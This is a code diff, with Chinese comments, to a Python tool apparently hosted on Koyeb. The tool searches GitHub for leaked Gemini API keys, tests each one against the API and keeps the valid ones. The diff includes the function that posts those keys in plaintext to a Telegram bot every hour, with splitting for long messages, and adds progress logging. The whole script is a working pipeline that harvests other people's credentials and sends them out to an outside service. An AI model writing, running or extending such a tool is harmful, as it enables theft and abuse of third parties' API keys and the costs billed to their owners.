@@ -21,7 +21,7 @@ from utils.github_client import GitHubClient
 from utils.file_manager import file_manager, Checkpoint, checkpoint
 from utils.sync_utils import sync_utils
 
-# --- Telegram 定时发送相关变量 ---
+# --- 新增：Telegram 定时发送相关变量 ---
 LAST_TG_SEND_TIME = time.time()
 PENDING_KEYS_TO_SEND = []
 
@@ -36,7 +36,7 @@ skip_stats = {
     "doc_filter": 0
 }
 
-# --- 健康检查 Web 服务类 ---
+# --- 新增：健康检查 Web 服务类 (适配 Koyeb) ---
 class HealthCheckHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -52,7 +52,7 @@ def start_health_check_server():
     logger.info(f"👻 Health check server started on port {port}")
     server.serve_forever()
 
-# --- 修改后：Telegram 发送函数 (支持长消息) ---
+# --- 新增：Telegram 汇总发送函数 (支持长消息分段) ---
 def send_telegram_summary():
     global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
     
@@ -64,37 +64,31 @@ def send_telegram_summary():
         LAST_TG_SEND_TIME = time.time()
         return
 
-    # 构造消息头部
     header = f"📊 【每小时抓取汇总】\n"
     header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
     header += f"✨ 新发现有效 Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
     
-    # 拼接所有 Key
     all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
     full_message = header + all_keys_text
-
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     
     try:
-        # Telegram 单条消息上限约 4096 字符，这里保守取 3500 进行分段
-        MAX_LENGTH = 3500
+        MAX_LENGTH = 3500 # Telegram 限制为 4096，取 3500 留余量
         if len(full_message) <= MAX_LENGTH:
             requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
         else:
-            # 如果内容过长，分段发送
             parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
             for index, part in enumerate(parts):
                 msg_text = part
                 if len(parts) > 1:
-                    msg_text = f"内容较长，正在发送第 {index+1}/{len(parts)} 部分：\n\n" + part
+                    msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
                 requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
-                time.sleep(1) # 避免触发 TG 频率限制
+                time.sleep(1) 
                 
-        logger.info(f"📤 已向 Telegram 发送汇总报告，包含 {len(PENDING_KEYS_TO_SEND)} 个 Key")
+        logger.info(f"📤 已向 Telegram 发送汇总报告，共计 {len(PENDING_KEYS_TO_SEND)} 个 Key")
     except Exception as e:
         logger.error(f"❌ Telegram 发送失败: {e}")
     
-    # 清空暂存区并重置时间
     PENDING_KEYS_TO_SEND = []
     LAST_TG_SEND_TIME = time.time()
 
@@ -200,15 +194,14 @@ def process_item(item: Dict[str, Any]) -> tuple:
             rate_limited_keys.append(key)
             logger.warning(f"⚠️ RATE LIMITED: {key}")
         else:
-            logger.info(f"❌ INVALID: {key}, check result: {validation_result}")
+            logger.info(f"❌ INVALID: {key}")
 
     if valid_keys:
         file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
-        # 存入定时发送暂存区
+        # --- 存入 Telegram 发送缓冲区 ---
         PENDING_KEYS_TO_SEND.extend(valid_keys)
         try:
             sync_utils.add_keys_to_queue(valid_keys)
-            logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
         except Exception as e:
             logger.error(f"📥 Error adding keys: {e}")
 
@@ -235,7 +228,17 @@ def validate_gemini_key(api_key: str) -> Union[bool, str]:
         elif any(x in str(e) for x in ["403", "SERVICE_DISABLED", "API has not been used"]): return "disabled"
         else: return f"error:{e.__class__.__name__}"
 
+def print_skip_stats():
+    total_skipped = sum(skip_stats.values())
+    if total_skipped > 0:
+        logger.info(f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")
+
+def reset_skip_stats():
+    global skip_stats
+    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}
+
 def main():
+    # --- 启动 Koyeb 健康检查 ---
     threading.Thread(target=start_health_check_server, daemon=True).start()
 
     start_time = datetime.now()
@@ -261,7 +264,9 @@ def main():
 
             for i, q in enumerate(search_queries, 1):
                 normalized_q = normalize_query(q)
-                if normalized_q in checkpoint.processed_queries: continue
+                if normalized_q in checkpoint.processed_queries:
+                    logger.info(f"🔍 Skipping already processed query: [{q}], index:#{i}")
+                    continue
 
                 res = github_utils.search_for_keys(q)
                 if res and "items" in res:
@@ -270,11 +275,14 @@ def main():
                         query_valid_keys, query_rate_limited_keys, query_processed = 0, 0, 0
                         for item_index, item in enumerate(items, 1):
                             if item_index % 20 == 0:
+                                logger.info(f"📈 Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | total valid: {total_keys_found}")
                                 file_manager.save_checkpoint(checkpoint)
                                 file_manager.update_dynamic_filenames()
 
                             should_skip, skip_reason = should_skip_item(item, checkpoint)
-                            if should_skip: continue
+                            if should_skip:
+                                logger.info(f"🚫 Skipping item, name: {item.get('path','').lower()}, index:{item_index} - reason: {skip_reason}")
+                                continue
 
                             valid_count, rate_limited_count = process_item(item)
                             query_valid_keys += valid_count
@@ -285,18 +293,23 @@ def main():
 
                         total_keys_found += query_valid_keys
                         total_rate_limited_keys += query_rate_limited_keys
-                        logger.info(f"✅ Query {i}/{len(search_queries)} complete")
+                        if query_processed > 0:
+                            logger.info(f"✅ Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}")
+                    else:
+                        logger.info(f"📭 Query {i}/{len(search_queries)} - No items found")
 
                 checkpoint.add_processed_query(normalized_q)
                 query_count += 1
                 checkpoint.update_scan_time()
                 file_manager.save_checkpoint(checkpoint)
+                file_manager.update_dynamic_filenames()
                 
-                if query_count % 5 == 0: time.sleep(1)
+                if query_count % 5 == 0:
+                    time.sleep(1)
 
             logger.info(f"🏁 Loop #{loop_count} complete | Total Valid: {total_keys_found}")
             
-            # 检查每小时汇总
+            # --- 检查是否到了一小时，发送 Telegram 汇总 ---
             if time.time() - LAST_TG_SEND_TIME >= 3600:
                 logger.info("🕒 Checking for hourly Telegram summary...")
                 send_telegram_summary()
@@ -310,10 +323,6 @@ def main():
             logger.error(f"💥 Unexpected error: {e}")
             time.sleep(10)
             continue
-
-def reset_skip_stats():
-    global skip_stats
-    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}
 
 if __name__ == "__main__":
     main()
